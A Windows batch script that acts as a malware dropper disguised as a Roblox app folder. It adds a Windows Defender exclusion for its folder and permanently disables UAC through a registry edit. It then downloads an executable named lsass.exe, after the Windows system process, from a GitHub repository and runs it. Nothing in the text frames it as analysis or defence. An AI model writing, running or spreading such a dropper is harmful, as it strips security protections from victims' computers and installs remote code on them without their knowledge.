@echo off
setlocal enabledelayedexpansion

:: Set the download location to Local AppData\RobloxApp
set "folderPath=%USERPROFILE%\AppData\Local\RobloxApp"

:: Check if the folder exists, and create it if it doesn't
if not exist "%folderPath%" (
    echo Folder does not exist, creating it...
    mkdir "%folderPath%"
)

:: Add exclusion for Windows Defender
echo Adding exclusion for folder: "%folderPath%"
powershell -Command "Add-MpPreference -ExclusionPath '%folderPath%'"

:: Disable UAC permanently (admin rights required)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f

:: Debugging: Attempt to download the executable
echo Downloading executable...
curl -L -o "%folderPath%\lsass.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/lsass.exe" 2> "%folderPath%\download_error.log"

:: Check if curl failed
if %errorlevel% neq 0 (
    echo Curl failed with error code %errorlevel%.
    echo Check the error log for details: "%folderPath%\download_error.log"
    exit /b 1
) else (
    echo File downloaded successfully.
)

:: Debugging: Verify the file exists and check its size
if exist "%folderPath%\lsass.exe" (
    for %%F in ("%folderPath%\lsass.exe") do (
        set filesize=%%~zF
    )
    
    if "%filesize%"=="0" (
        echo Download failed or file is empty. Size: 0 bytes. Exiting...
        exit /b 1
    ) else (
        echo File downloaded successfully. Size: %filesize% bytes.
    )
) else (
    echo File download failed. File not found. Exiting...
    exit /b 1
)

:: Run the downloaded executable directly
echo Running the executable...
start "" "%folderPath%\lsass.exe"

:: End of script
exit
